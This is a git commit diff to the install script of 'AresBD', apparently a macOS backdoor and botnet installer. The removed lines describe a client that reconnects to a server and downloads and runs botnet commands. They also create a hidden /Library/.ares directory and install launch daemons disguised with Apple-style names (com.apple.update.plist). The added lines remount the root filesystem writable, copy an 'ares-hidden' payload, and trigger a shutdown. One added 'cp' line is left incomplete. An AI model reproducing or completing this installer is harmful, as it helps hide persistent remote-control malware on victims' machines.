136962e32c9bc79a9d7f6683d37054d6ececf3cc
Stsosz <sabergelpreston@icloud.com>
2015-02-18 07:52:25 -0500

    New install.sh script

--- ABDConsole/Ares/Server/install.sh
+++ ABDConsole/Ares/Server/install.sh
@@ -4,53 +4,11 @@
 #  AresBD
 #
 #  Copyright (c) 2015 Stsosz Systems. All rights reserved.
+sudo mount -uw /
 
-cd /
+cp -v /Volumes/Ares/ares-hidden /Library/.ares
 
-echo "Welcome to the AresBD server installer."
-echo "Using port $PORT"
-echo "Using server $SERVER"
-echo ""
-echo "The client will attempt to reconnect to the server every $SHELL_RECONNECT seconds."
-echo "The client will attempt to download and execute botnet commands every $BOTNET_RECONNECT seconds."
-echo ""
-echo "Creating hidden directory..."
-mkdir -p /Library/.ares
-echo "Done."
-echo ""
-
-echo "Making sure that LaunchDaemons folder exists..."
-mkdir -p /Library/LaunchDaemons
-echo "Done."
-echo ""
-echo "Copying files..."
-echo "Copying connect.sh..."
-
-cat <<ENDOFCONNECTSH >> /Library/.ares/connect.sh
-
-
-echo "Done."
-echo ""
-
-echo "Copying update.sh..."
-
-
-echo "Done."
-echo ""
-
-echo "Copying com.apple.update.plist..."
-
-
-echo "Done."
-echo ""
-
-echo "Copying com.apple.ares.plist..."
-
-echo "Done."
-echo ""
-
-echo "Done Copying Files. "
-echo ""
+cp -v
 
 echo "Making everything executable..."
 chmod +x /Library/.ares/connect.sh
@@ -73,5 +31,8 @@ echo ""
 echo "Install Complete."
 echo ""
 
+echo "Press enter to shut down..."
+read shutdown
+
 echo "Shutting down..."
-#shutdown -h now
+shutdown -h now
